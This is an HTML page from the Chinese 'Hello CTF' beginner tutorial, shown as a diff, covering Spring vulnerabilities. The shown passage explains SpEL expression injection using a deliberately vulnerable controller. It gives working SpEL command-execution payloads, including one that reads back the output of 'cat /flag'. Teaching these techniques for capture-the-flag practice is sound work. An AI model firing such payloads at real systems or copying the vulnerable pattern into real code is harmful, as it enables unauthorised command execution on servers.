@@ -1,0 +1,1444 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>Spring漏洞 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link" href="../php_features/">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link" href="../py_unser/">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../py_sandbox/">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link" href="../java_unser/">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link on" href="./">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../foothold/">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../proxy_tunnel/">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link" href="../ad_basic/">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link" href="../web_pwn/">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="spring">Spring漏洞<a class="headerlink" href="#spring" title="Permanent link">¶</a></h1>
+<blockquote>
+<p><a href="https://github.com/ProbiusOfficial/Hello-CTF">ProbiusOfficial/Hello-CTF</a></p>
+</blockquote>
+<p>本章面向在 CTF 中遇到 Java Web 题就两眼一抹黑的同学。Spring 全家桶的历史漏洞非常多，我们「够用即止」：只需要知道最常考的三类——<strong>SpEL 表达式注入</strong>、<strong>Actuator 未授权访问</strong>、<strong>Spring4Shell（CVE-2022-22965）</strong>，再配上一道例题，就能应对绝大多数入门到中级的 Spring 题了。</p>
+<h2 id="spring_1">Spring 生态极简介绍<a class="headerlink" href="#spring_1" title="Permanent link">¶</a></h2>
+<p>Java Web 的原始形态是 Servlet：每个请求对应一个类，手写 <code>doGet</code>/<code>doPost</code>，繁琐且难以维护。Spring 就是为了让这件事不那么痛苦而出现的框架。对做题而言，你只需要分清两个概念：</p>
+<ul>
+<li><strong>Spring MVC</strong>：一个 Web 框架。核心是「控制器（Controller）」——用注解把一个 Java 方法绑定到某个 URL 上，比如 <code>@RequestMapping("/hello")</code>。请求进来后，框架负责把参数解析好、塞进方法里。</li>
+<li><strong>Spring Boot</strong>：一个「脚手架」。传统的 Spring 配置要写一堆 XML，Spring Boot 的口号是约定大于配置——内置 Tomcat，打一个 jar 包 <code>java -jar</code> 就能跑。现在 CTF 里的 Java Web 题几乎全是 Spring Boot 应用。</li>
+</ul>
+<p>一个最简 Spring Boot 控制器长这样：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nd">@RestController</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HelloController</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">"/hello"</span><span class="p">)</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">hello</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">"Hello "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="p">;</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">}</span>
+</code></pre></div>
+<p><strong>在 CTF 中怎么认出目标是 Spring？</strong> 几个明显特征：</p>
+<ul>
+<li>报错页面是经典的 "Whitelabel Error Page"；</li>
+<li>响应头里有 <code>X-Application-Context</code>；</li>
+<li>随便访问一个不存在的路径，返回 JSON 里带 <code>timestamp</code>、<code>status</code>、<code>error</code>、<code>path</code> 字段；</li>
+<li>端口常见 <code>8080</code>，路径下挂着 <code>/actuator</code>、<code>/env</code> 等端点。</li>
+</ul>
+<p>另外提醒一点：Java 题本地调试比较重，本章所有环境都可以直接用 vulhub 一键起容器，不会用 Docker 的同学请先阅读「Docker与漏洞环境」一章。</p>
+<h2 id="spel">SpEL 表达式注入<a class="headerlink" href="#spel" title="Permanent link">¶</a></h2>
+<h3 id="spel_1">什么是 SpEL<a class="headerlink" href="#spel_1" title="Permanent link">¶</a></h3>
+<p>SpEL（Spring Expression Language）是 Spring 自带的表达式语言，作用和 Python 的 Jinja2 模板里的 <code>{{ }}</code> 非常像——在运行期对一段字符串求值。如果你做过 SSTI（见「SSTI注入」一章），SpEL 注入的思路几乎一模一样。</p>
+<p>SpEL 表达式用 <code>${...}</code> 或 <code>#{...}</code> 包裹，可以出现在很多配置和注解里：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nd">@Value</span><span class="p">(</span><span class="s">"${app.name}"</span><span class="p">)</span><span class="w">              </span><span class="c1">// 读配置</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nd">@PreAuthorize</span><span class="p">(</span><span class="s">"hasRole('ADMIN')"</span><span class="p">)</span><span class="w"> </span><span class="c1">// 权限注解里的表达式</span>
+</code></pre></div>
+<p>危险的写法是开发者把用户输入拼进表达式里再求值：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@RestController</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SpelController</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">"/spel"</span><span class="p">)</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">spel</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">exp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">        </span><span class="c1">// 典型的漏洞写法：用户输入直接进 SpEL 解析器</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">        </span><span class="n">ExpressionParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SpelExpressionParser</span><span class="p">();</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">parser</span><span class="p">.</span><span class="na">parseExpression</span><span class="p">(</span><span class="n">exp</span><span class="p">).</span><span class="na">getValue</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="p">}</span>
+</code></pre></div>
+<p>访问 <code>/spel?exp=1+1</code>，返回 <code>2</code>——说明输入被当作表达式执行了。</p>
+<h3 id="payload">Payload 构造<a class="headerlink" href="#payload" title="Permanent link">¶</a></h3>
+<p>SpEL 里有个关键特性：<code>T()</code> 运算符可以引用任意 Java 类。于是命令执行就是一句话的事：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="err">'</span><span class="n">id</span><span class="err">'</span><span class="p">)</span>
+</code></pre></div>
+<p>在真实题目里通常要读回显，<code>exec</code> 返回的是 <code>Process</code> 对象，需要把输出流读出来。常用的一条龙 payload：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="err">'</span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">flag</span><span class="err">'</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">()).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="err">'\\</span><span class="n">A</span><span class="err">'</span><span class="p">).</span><span class="na">next</span><span class="p">()</span>
+</code></pre></div>
+<p>逐步拆开看：</p>
+<ol>
+<li><code>T(java.lang.Runtime).getRuntime().exec('cat /flag')</code> —— 执行命令，得到 <code>Process</code>；</li>
+<li><code>.getInputStream()</code> —— 拿到命令的 stdout；</li>
+<li><code>new java.util.Scanner(...).useDelimiter('\A').next()</code> —— 把流一次性读成字符串（<code>\A</code> 表示全文边界）。</li>
+</ol>
